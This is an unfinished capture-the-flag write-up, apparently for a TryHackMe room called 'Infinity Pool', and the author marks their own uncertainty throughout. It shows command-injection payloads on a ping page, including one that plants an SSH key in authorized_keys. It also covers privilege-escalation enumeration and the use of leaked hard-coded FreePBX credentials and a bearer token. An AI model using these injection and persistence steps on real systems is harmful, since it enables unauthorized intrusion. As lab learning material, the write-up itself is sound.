# Title: Infinity Pool

#### Category: Boot2Root
#### Difficulty: Medium

#### Description: 

No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.

---

## Task 1: Hacker Holidays Storyline: Act 3 - Reckoning

<img width="925" height="748" alt="image" src="https://github.com/user-attachments/assets/5e658250-1647-4756-bb97-8655fb740162" />

<img width="925" height="582" alt="image" src="https://github.com/user-attachments/assets/bb0deb48-e543-4d32-adac-4f6a58ff973a" />

#### Analysis: 
(I don't know if this is right, just correct it)
There's an attack and there's pattern? 
It's about the patch and the slides that proves of the attack? 
An attacker infiltrated through the patch? 

---

## Task 2: Hacker Holidays: Day 11

<img width="473" height="633" alt="image" src="https://github.com/user-attachments/assets/4d50e7db-8b30-4632-bcb2-1ddfa740123c" />

#### Analysis

---

### Methodology

This is a CVE 
> CVE-2026-46376
Title: FreePBX: Unauthenticated Use of Hard-Coded Credentials Vulnerability in FreePBX UCP Interface
(But how did we know that this is this CVE, at the first place?)


Access the website
```LAB_IP```

Inspect
There's a app.js file under the static folder 

Access the app.js 

This gives us a lot of information about the structure of the website 
/status
/internal/netcheck
robots.txt 


Access the /status folder 
```LAB_IP/status```

This is a ping website, since you can ping from these you can do things 

```
127.0.0.1
127.0.0.1$(id)
127.0.0.1;id
127.0.0.1;id;#
```

We got response this means it is accessible, maybe we could access the user flag from here 
127.0.0.1;ls/home/web/

 We now know the location of the 
 > user.txt 



We will do some ssh to access it and find the root 
Generate temporary SSH key

Paste to terminal
```ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""```

```cat ctf_key.pub```

```base64 -w0 ctf_key.pub```

Paste the result of this to the command below

```
host=127.0.0.1;mkdir -p /home/web/.ssh;echo <paste_base64_key>|base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#
```

Go to website and and paste the command above. 


We can now SSH the website
```ssh -o IdentitiesOnly=yes -i ctf_key web@10.128.137.248```

```id```

```ls```



``` cd .. ```

``` cd /var/wwww/ ```

``` ls ```

``` cd infinity_pool/ ```

``` ls -la```

We still don't have permissions to this account 

We will do some privilege escalation

(What are the possible ways for privilege escalation?)

          Classic Privilege Escalation (Option)
            ```
                id
                hostname
                pwd
                uname -a
                cat /etc/os-release
            ```

Proceed to this after ls -la
```find / -perm -4000 -type f 2>/dev/null```

          Option: 
          > getcap -r / 2>/dev/null
          > cat /etc/crontab
            ls -la /etc/cron.d
            systemctl list-timers --all --no-pager

Command
```ps auxww```



look for the automation and watchtower details 
``` ls /etc/systemd/system/```



(How did we know that we are going to look for the automation and watchtower services??)



```
cat /etc/systemd/system/cc-automation.service
```
This is port 9000



```
cat /etc/systemd/system/cc-watchtower.service
```
This is port 3000


We can't still access the two of it because they need root permission 


##Query the root automation service
```curl -sS http://127.0.0.1:9000/health```
Result: 
This is a deadend because we don't have the automation key to access it so let's try the por 3000





##Query the root Watchtower service
Command:
```curl -sS http://127.0.0.1:3000/```
Result:
```
  /api/health
  /api/config
```
Command:
```curl -sS http://127.0.0.1:3000/api/config ```
Result: 
```
  {
    "automation_endpoint": "http://127.0.0.1:9000",
    "note": "internal network only -- do not expose",
    "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
    "telephony_pass": "St4yN0t1c3d_2026",
    "telephony_portal": "http://127.0.0.1:8080/ucp",
    "telephony_user": "FreePBXUCPTemplateCreator"
  }
```

This gives us the portal, user and password  
We can see this "FreePBXUCPTemplateCreator", which is a CVE or vulnerability and let's try to exploit it 




Check the version if this is really vuln to the said CVE 
##FreePBX hard-coded template credential issue, CVE-2026-46376

(What's the purpose of this two? what they do?)

Command:
```
    grep -i version /var/www/html/admin/modules/ucp/module.xml
```
Result:

Command:
```
    grep -i version /var/www/html/admin/modules/userman/module.xml 
```
Result:




Since we now know that this is are vulnerable to freepbx 
Let's exploit it



Open another terminal: 

Port Forwarding 
```
ssh -o IdentitiesOnly=yes -i ctf_key \
  -L 8080:127.0.0.1:8080 \
  web@10.129.152.181
```


```
http://127.0.0.1:8080/ucp/  
```




##Send a legitimate export request

```
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"latest"}'
```














---

### Today's Itinerary

1. Find the user flag
>

2. Find the root flag
> 


---

### Flag
> THM{}

